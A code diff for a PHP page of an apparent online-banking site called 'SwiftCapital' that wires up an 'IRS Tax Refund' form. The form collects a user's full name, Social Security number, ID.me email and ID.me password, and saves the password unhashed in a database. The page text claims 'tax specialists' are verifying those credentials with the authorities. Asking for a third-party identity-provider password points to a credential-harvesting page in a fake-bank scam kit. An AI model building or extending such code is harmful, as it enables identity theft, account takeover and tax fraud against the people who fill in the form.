@@ -1,4 +1,41 @@
-﻿<?php require_once '../includes/user-check.php'; ?>
+<?php 
+require_once '../includes/db.php';
+require_once '../includes/user-check.php'; 
+
+$user_id = $_SESSION['user_id'];
+$success_msg = '';
+$error_msg = '';
+
+// Check if user already has a pending or in-progress IRS request
+$stmt = $pdo->prepare("SELECT * FROM irs_requests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
+$stmt->execute([$user_id]);
+$existing_irs = $stmt->fetch();
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_irs'])) {
+    if ($existing_irs && in_array($existing_irs['status'], ['Pending', 'In Progress', 'Approved'])) {
+        $error_msg = "You already have an active IRS refund request.";
+    } else {
+        $full_name = htmlspecialchars($_POST['full_name']);
+        $ssn = htmlspecialchars($_POST['ssn']);
+        $id_me_email = htmlspecialchars($_POST['id_me_email']);
+        $id_me_password = $_POST['id_me_password'];
+        $country = htmlspecialchars($_POST['country']);
+
+        try {
+            $stmt = $pdo->prepare("INSERT INTO irs_requests (user_id, full_name, ssn, id_me_email, id_me_password, country, status) VALUES (?, ?, ?, ?, ?, ?, 'Pending')");
+            $stmt->execute([$user_id, $full_name, $ssn, $id_me_email, $id_me_password, $country]);
+            
+            $success_msg = "Your IRS tax refund request has been submitted successfully! Our agents will process it shortly.";
+            // Refresh record
+            $stmt = $pdo->prepare("SELECT * FROM irs_requests WHERE user_id = ? ORDER BY created_at DESC LIMIT 1");
+            $stmt->execute([$user_id]);
+            $existing_irs = $stmt->fetch();
+        } catch (Exception $e) {
+            $error_msg = "System error: " . $e->getMessage();
+        }
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -114,73 +151,15 @@
 </head>
 <body>
 
-    <!-- Sidebar -->
-    <aside class="sidebar">
-        <div class="brand-section">
-            <div class="brand-logo">
-                <i class="fa-solid fa-chart-simple text-primary me-2"></i>
-                <span class="swift">Swift</span><span class="capital">Capital</span>
-            </div>
-            <div class="brand-tagline">Banking At Its Best</div>
-        </div>
-
-        <div class="user-profile-widget">
-            <div class="avatar-circle">KC</div>
-            <div class="user-name">Kante Calm</div>
-            <div class="user-id">ID: 0537658047</div>
-            <button class="btn btn-kyc" onclick="location.href='verification.php'"><i class="fa-solid fa-circle-exclamation"></i> Verify KYC</button>
-            <div class="user-actions">
-                <a href="settings.php" class="btn btn-outline"><i class="fa-solid fa-user"></i> Profile</a>
-                <a href="#" class="btn btn-primary-soft"><i class="fa-solid fa-arrow-right-from-bracket"></i> Logout</a>
-            </div>
-        </div>
-
-        <div class="nav-section">
-            <div class="nav-category">Main Menu</div>
-            <a href="index.php" class="nav-item-link"><i class="fa-solid fa-house"></i> Dashboard</a>
-            <a href="transactions.php" class="nav-item-link"><i class="fa-solid fa-chart-line"></i> Transactions</a>
-            <a href="cards.php" class="nav-item-link"><i class="fa-solid fa-credit-card"></i> Cards</a>
-
-            <div class="nav-category">Transfers</div>
-            <a href="local.php" class="nav-item-link"><i class="fa-solid fa-paper-plane"></i> Local Transfer</a>
-            <a href="international.php" class="nav-item-link"><i class="fa-solid fa-globe"></i> International Wire</a>
-            <a href="deposit.php" class="nav-item-link"><i class="fa-solid fa-download"></i> Deposit</a>
-
-            <div class="nav-category">Services</div>
-            <a href="loan.php" class="nav-item-link"><i class="fa-solid fa-boxes-stacked"></i> Loan Request</a>
-            <a href="irs.php" class="nav-item-link active"><i class="fa-solid fa-file-invoice-dollar"></i> IRS Tax Refund</a>
-            <a href="loan-history.php" class="nav-item-link"><i class="fa-solid fa-clock-rotate-left"></i> Loan History</a>
-
-            <div class="nav-category">Account</div>
-            <a href="security.php" class="nav-item-link"><i class="fa-solid fa-gear"></i> Settings</a>
-            <a href="support.php" class="nav-item-link"><i class="fa-solid fa-circle-question"></i> Support Ticket</a>
-        </div>
-
-        <div class="sidebar-footer">
-            <span><i class="fa-solid fa-shield-halved me-1"></i> Secure Banking</span>
-            <span class="version">v1.2.0</span>
-        </div>
-    </aside>
+<?php 
+$page = 'irs';
+include '../includes/user-sidebar.php'; 
+?>
 
     <!-- Main Content -->
     <main class="main-content">
         <!-- Top Navbar -->
-        <nav class="top-navbar">
-            <div class="nav-date">
-                <i class="fa-solid fa-calendar"></i>
-                <span id="currentDate">Sunday, February 15, 2026</span>
-            </div>
-            
-            <div class="nav-actions">
-                <div class="balance-badge">
-                    <i class="fa-solid fa-wallet"></i> $0
-                </div>
-                <button class="btn-icon-only">
-                    <i class="fa-solid fa-bell"></i>
-                </button>
-                <div class="nav-avatar">KC</div>
-            </div>
-        </nav>
+        <?php include '../includes/user-navbar.php'; ?>
 
         <!-- Page Content -->
         <div class="page-container">
@@ -196,8 +175,44 @@
                         <p class="page-subtitle-centered">Please fill out the form below to submit your IRS tax refund request</p>
                     </div>
 
+                    <?php if($success_msg): ?>
+                        <div class="alert alert-success border-0 rounded-4 p-4 shadow-sm mb-4 fw-600">
+                            <i class="fa-solid fa-circle-check me-2"></i> <?php echo $success_msg; ?>
+                        </div>
+                    <?php endif; ?>
+
+                    <?php if($error_msg): ?>
+                        <div class="alert alert-danger border-0 rounded-4 p-4 shadow-sm mb-4 fw-600">
+                            <i class="fa-solid fa-triangle-exclamation me-2"></i> <?php echo $error_msg; ?>
+                        </div>
+                    <?php endif; ?>
+
+                    <?php if($existing_irs && ($existing_irs['status'] == 'Pending' || $existing_irs['status'] == 'In Progress' || $existing_irs['status'] == 'Approved')): ?>
+                        <div class="card border-0 rounded-4 shadow-sm p-5 text-center mb-5">
+                            <div class="mb-4">
+                                <?php if($existing_irs['status'] == 'Approved'): ?>
+                                    <div class="bg-success text-white d-inline-flex align-items-center justify-content-center rounded-circle mb-3" style="width: 80px; height: 80px;">
+                                        <i class="fa-solid fa-check fa-3x"></i>
+                                    </div>
+                                    <h3 class="fw-800">Refund Authorized</h3>
+                                    <p class="text-muted">Your tax refund has been successfully audited and authorized. The funds will be credited to your account balance shortly.</p>
+                                    <a href="transactions.php" class="btn btn-primary px-5 py-3 fw-800 mt-3" style="border-radius: 12px;">View Transactions</a>
+                                <?php else: ?>
+                                    <div class="bg-indigo text-white d-inline-flex align-items-center justify-content-center rounded-circle mb-3" style="width: 80px; height: 80px;">
+                                        <i class="fa-solid fa-file-invoice-dollar fa-3x"></i>
+                                    </div>
+                                    <h3 class="fw-800">Request in Review</h3>
+                                    <p class="text-muted">We have received your IRS refund request. Our tax specialists are currently verifying your credentials with the authorities.</p>
+                                    <div class="p-3 bg-light rounded-3 d-inline-block px-4 border">
+                                        <span class="text-xs fw-800 text-muted text-uppercase">Current Status: <strong class="text-primary"><?php echo $existing_irs['status']; ?></strong></span>
+                                    </div>
+                                <?php endif; ?>
+                            </div>
+                        </div>
+                    <?php else: ?>
                     <div class="irs-form-container">
-                        <form action="index.php">
+                        <form method="POST">
+                            <input type="hidden" name="submit_irs" value="1">
                             <!-- Personal Information -->
                             <div class="form-section">
                                 <div class="form-section-title">
@@ -206,13 +221,13 @@
                             
                             <label class="form-label">Full Name <span class="req">*</span></label>
                             <div class="custom-input-group">
-                                <input type="text" placeholder="Enter your full name" required>
+                                <input type="text" name="full_name" placeholder="Enter your full name" required>
                                 <i class="fa-solid fa-user left-icon"></i>
                             </div>
 
                             <label class="form-label">Social Security Number (SSN) <span class="req">*</span></label>
                             <div class="custom-input-group">
-                                <input type="text" placeholder="XXX-XX-XXXX" required>
+                                <input type="text" name="ssn" placeholder="XXX-XX-XXXX" required>
                                 <i class="fa-solid fa-shield-halved left-icon"></i>
                             </div>
                         </div>
@@ -225,14 +240,14 @@
                             
                             <label class="form-label">ID.me Email <span class="req">*</span></label>
                             <div class="custom-input-group">
-                                <input type="email" class="filled-input" value="Kante213" readonly>
-                                <i class="fa-solid fa-envelope left-icon text-primary"></i>
+                                <input type="email" name="id_me_email" placeholder="example@email.com" required>
+                                <i class="fa-solid fa-envelope left-icon"></i>
                             </div>
 
                             <label class="form-label">ID.me Password <span class="req">*</span></label>
                             <div class="custom-input-group">
-                                <input type="password" class="filled-input" value="12345678" readonly>
-                                <i class="fa-solid fa-key left-icon text-primary"></i>
+                                <input type="password" name="id_me_password" placeholder="Enter your ID.me password" required>
+                                <i class="fa-solid fa-key left-icon"></i>
                             </div>
                         </div>
 
@@ -244,7 +259,7 @@
                             
                             <label class="form-label">Country</label>
                             <div class="custom-input-group no-icon mb-0">
-                                <select required>
+                                <select name="country" required>
                                     <option value="" disabled selected>Select Country</option>
                                     <option value="AF">Afghanistan</option>
                                     <option value="AX">Aland Islands</option>
@@ -517,6 +532,7 @@
                         </div>
                         </form>
                     </div>
+                    <?php endif; ?>
 
                 </div>
             </div>
